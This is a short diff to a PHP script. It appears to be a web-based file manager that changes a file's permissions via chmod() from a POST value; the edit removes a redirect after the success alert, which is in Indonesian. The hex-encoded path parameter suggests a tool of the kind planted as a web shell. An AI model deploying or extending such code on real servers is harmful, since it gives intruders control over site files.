@@ -304,7 +304,7 @@
                 if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['permissions'])) {
                     $permissions = $_POST['permissions'];
                     chmod($file, octdec($permissions));
-                    echo "<script>alert('Permissions berhasil diubah.'); window.location='?path=" . hex($path) . "';</script>";
+                    echo "<script>alert('Permissions berhasil diubah.');</script>";
                 }
                 $currentPermissions = substr(sprintf('%o', fileperms($file)), -4);
                 echo "<div class='mt-4'>
